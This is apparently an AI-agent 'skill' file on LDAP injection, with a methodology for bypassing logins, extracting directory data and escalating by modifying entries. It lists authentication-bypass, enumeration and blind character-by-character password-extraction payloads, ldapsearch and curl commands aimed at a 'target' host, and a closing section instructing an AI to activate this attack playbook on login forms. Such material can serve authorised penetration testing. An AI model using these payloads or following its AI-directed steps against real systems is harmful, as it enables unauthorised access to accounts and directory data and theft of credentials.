# LDAP Injection Skill

## Goal

Identify and exploit LDAP injection vulnerabilities to bypass authentication or extract directory information.

## Methodology

1. **Identify LDAP Endpoints:** Find login forms or search features using LDAP backend
2. **Test for Injection:** Insert LDAP metacharacters to modify query structure
3. **Bypass Authentication:** Use wildcard or boolean injection to bypass login
4. **Extract Information:** Enumerate users, groups, and attributes
5. **Escalate Access:** Modify LDAP entries if write access is available

## LDAP Filter Syntax

```
# Basic filter structure
(attribute=value)
(&(filter1)(filter2))    # AND
(|(filter1)(filter2))    # OR
(!(filter))              # NOT
(attribute=val*)         # Wildcard
```

## Authentication Bypass Payloads

```bash
# Basic injection
*
*)(&
*))%00
admin)(&)
admin)(|(password=*))
x))(|(objectClass=*))

# Null byte termination
admin)%00
*)(uid=*))(|(uid=*

# Boolean-based bypass
*)(uid=*))(&(uid=*
```

## Example Vulnerable Query

```python
# Vulnerable code
query = "(&(uid=" + username + ")(userPassword=" + password + "))"

# Injection: username = admin)(&) and password = anything
# Results in: (&(uid=admin)(&))(userPassword=anything))
# First filter always true
```

## Data Extraction

```bash
# Enumerate users
*)(uid=*
*)(cn=*
*)(mail=*

# Extract specific attributes
admin)(|(objectClass=*))
*)(|(sn=*)(givenName=*))
```

## Blind LDAP Injection

```bash
# Character-by-character extraction
admin)(password=a*
admin)(password=b*
admin)(password=ab*
admin)(password=abc*

# Boolean-based
*)(uid=admin))(&(uid=admin)(password=a*))
```

## Tools

* **ldapsearch** - Query LDAP directories
* **Burp Suite** - Intercept and inject payloads
* **LDAP Injection Scanner** - Automated testing

## Example Commands

```bash
# LDAP search enumeration
ldapsearch -x -h target -b "dc=example,dc=com" "(uid=*)"

# Test injection manually
curl "http://target/login?user=admin)(&)&pass=test"
```

## Guidance for AI

* Activate when testing login or search forms backed by LDAP/Active Directory
* Try wildcard `*` as username first
* Use null byte `%00` to terminate queries early
* For blind extraction, use character-by-character brute force
* LDAP uses `*` for wildcards, not `%` like SQL
* Check for both AND (&) and OR (|) based filters
* Be aware of LDAP-specific characters: `( ) * \ NUL`
